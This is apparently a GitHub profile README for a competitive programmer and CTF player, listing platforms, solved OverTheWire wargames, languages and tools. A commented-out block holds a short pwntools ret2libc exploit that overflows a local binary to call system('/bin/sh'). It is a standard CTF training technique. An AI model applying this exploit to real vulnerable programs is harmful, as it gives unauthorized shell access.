<div align="center">

<p align="center">
  <pre align="center">
██╗      ██╗ ██╗   ██╗ ███████╗ ██╗   ██╗ ███████╗ ███████╗ ██████╗ 
██║      ██║ ██║   ██║ ██╔════╝ ██║   ██║ ██╔════╝ ██╔════╝ ██╔══██╗
██║      ██║ ██║   ██║ █████╗   ██║   ██║ ███████╗ █████╗   ██████╔╝
██║      ██║ ╚██╗ ██╔╝ ██╔══╝   ██║   ██║ ╚════██║ ██╔══╝   ██╔══██╗
███████╗ ██║  ╚████╔╝  ███████╗ ╚██████╔╝ ███████║ ███████╗ ██║  ██║
╚══════╝ ╚═╝   ╚═══╝   ╚══════╝  ╚═════╝  ╚══════╝ ╚══════╝ ╚═╝  ╚═╝
  </pre>
</p>

### `> Competitive Programmer · CTF Player · Low-Level Enthusiast`

*I live in the terminal. I speak to machines in their own language.*  
*I break things to understand them — and build things others can't break.*

<br/>

[![Codeforces](https://img.shields.io/badge/Codeforces-1F8ACB?style=for-the-badge&logo=codeforces&logoColor=white)](https://codeforces.com/profile/Wait_is_this_FFT)
[![LeetCode](https://img.shields.io/badge/LeetCode-FFA116?style=for-the-badge&logo=leetcode&logoColor=black)](https://leetcode.com/u/arrowlight)
[![picoCTF](https://img.shields.io/badge/picoCTF-008000?style=for-the-badge&logo=hackthebox&logoColor=white)](https://learn.cylabacademy.org/users/coreDumped79)
[![CSES](https://img.shields.io/badge/CSES-Problem%20Set-0A7E07?style=for-the-badge)](https://cses.fi/user/340758)
[![AtCoder](https://img.shields.io/badge/AtCoder-222222?style=for-the-badge&logo=atcoder&logoColor=white)](https://atcoder.jp/users/Fulcrum69)
[![Monkeytype](https://img.shields.io/badge/Monkeytype-323437?style=for-the-badge&logo=monkeytype&logoColor=e2b714)](https://monkeytype.com/profile/arrowlight)

</div>

---

## `$ whoami`

```python
profile = {
    "focus"     : ["Competitive Programming", "Binary Exploitation", "Reverse Engineering", "Low-Level Systems"],
    "ctf"       : ["OverTheWire Bandit ✓", "OverTheWire Narnia ✓", "picoCTF (active)"],
    "platforms" : ["Codeforces", "AtCoder", "SPOJ", "CSES", "LeetCode"],
    "currently" : "grinding CTFs and climbing CP ratings simultaneously",
    "philosophy": "understand the machine at every layer of abstraction",
}
```

---

## `$ cat competitive_programming.txt`

> **Very active** across all major competitive programming platforms.  
> Algorithms, data structures, graph theory, DP — daily grind.

| Platform | Focus |
|----------|-------|
| 🔥 **Codeforces** | Rated contests · Div 1/2/3 · Virtual rounds |
| 🎯 **AtCoder** | ABC/ARC/AGC · Math-heavy problems |
| 🧩 **SPOJ** | Classic problems · Optimization |
| 📘 **CSES** | Clean algorithmic problem set |
| 💡 **LeetCode** | Interview-style + contest problems |

---

## `$ cat ctf_record.txt`

```
[✓] OverTheWire — Bandit    — All levels cleared  (Linux, privesc, SSH, networking)
[✓] OverTheWire — Narnia    — All levels cleared  (Binary exploitation, C vulns)
[~] picoCTF                 — Active               (Pwn · Rev · Forensics · Crypto)
```

<!-- **Exploit toolkit:**

```python
#!/usr/bin/env python3
# ret2libc — stack overflow → shell
from pwn import *
import struct

elf     = ELF('./vuln')
libc    = ELF('./libc.so.6')
pop_rdi = next(elf.search(asm('pop rdi; ret')))

payload = flat(
    b'A' * 72,          # padding to saved RIP
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system']
)
process(elf.path).sendline(payload)  # 🐚
``` -->

---

## `$ ls languages/`

**Low-level & Systems**

![C](https://img.shields.io/badge/C-00599C?style=flat-square&logo=c&logoColor=white)
![C++](https://img.shields.io/badge/C++-00427E?style=flat-square&logo=cplusplus&logoColor=white)
![Assembly](https://img.shields.io/badge/x86--64_ASM-525252?style=flat-square&logo=assemblyscript&logoColor=white)
![Rust](https://img.shields.io/badge/Rust-000000?style=flat-square&logo=rust&logoColor=white)

**Scripting & General**

![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white)
![Bash](https://img.shields.io/badge/Bash-4EAA25?style=flat-square&logo=gnubash&logoColor=white)
![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black)
![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=flat-square&logo=typescript&logoColor=white)
![Perl](https://img.shields.io/badge/Perl-39457E?style=flat-square&logo=perl&logoColor=white)

**Compiled & Functional**

![Go](https://img.shields.io/badge/Go-00ADD8?style=flat-square&logo=go&logoColor=white)
![Java](https://img.shields.io/badge/Java-ED8B00?style=flat-square&logo=openjdk&logoColor=white)
![Haskell](https://img.shields.io/badge/Haskell-5D4F85?style=flat-square&logo=haskell&logoColor=white)

---

## `$ cat tech_stack.txt`

**Security & Exploitation**

![pwntools](https://img.shields.io/badge/pwntools-FF4500?style=flat-square&logo=python&logoColor=white)
![GDB](https://img.shields.io/badge/GDB-red?style=flat-square&logo=gnu&logoColor=white)
![Ghidra](https://img.shields.io/badge/Ghidra-red?style=flat-square&logoColor=white)
![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=flat-square&logo=wireshark&logoColor=white)

**Web & Backend**

![React](https://img.shields.io/badge/React-20232A?style=flat-square&logo=react&logoColor=61DAFB)
![Node.js](https://img.shields.io/badge/Node.js-339933?style=flat-square&logo=nodedotjs&logoColor=white)
![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=flat-square&logo=mongodb&logoColor=white)
![Redis](https://img.shields.io/badge/Redis-DC382D?style=flat-square&logo=redis&logoColor=white)

**ML & Data**

![PyTorch](https://img.shields.io/badge/PyTorch-EE4C2C?style=flat-square&logo=pytorch&logoColor=white)
![NumPy](https://img.shields.io/badge/NumPy-013243?style=flat-square&logo=numpy&logoColor=white)
![scikit--learn](https://img.shields.io/badge/scikit--learn-F7931E?style=flat-square&logo=scikitlearn&logoColor=white)

---

## `$ cat github_stats.txt`


<div align="center">

![GitHub Stats](https://github-readme-stats.vercel.app/api?username=nasdbox&show_icons=true&theme=chartreuse-dark&hide_border=true&bg_color=0d0d0d&title_color=00ff41&icon_color=00ff41&text_color=aaaaaa)

![Top Languages](https://github-readme-stats.vercel.app/api/top-langs/?username=nasdbox&layout=compact&theme=chartreuse-dark&hide_border=true&bg_color=0d0d0d&title_color=00ff41&text_color=aaaaaa)

![GitHub Streak](https://streak-stats.demolab.com?user=nasdbox&theme=dark&hide_border=true&background=0d0d0d&ring=00ff41&fire=ff6b35&currStreakLabel=00ff41)

</div>

---

![](https://komarev.com/ghpvc/?username=nasdbox)

<div align="center">

`// built with` `01100011 01101111 01100100 01100101` `and too much coffee`

</div>
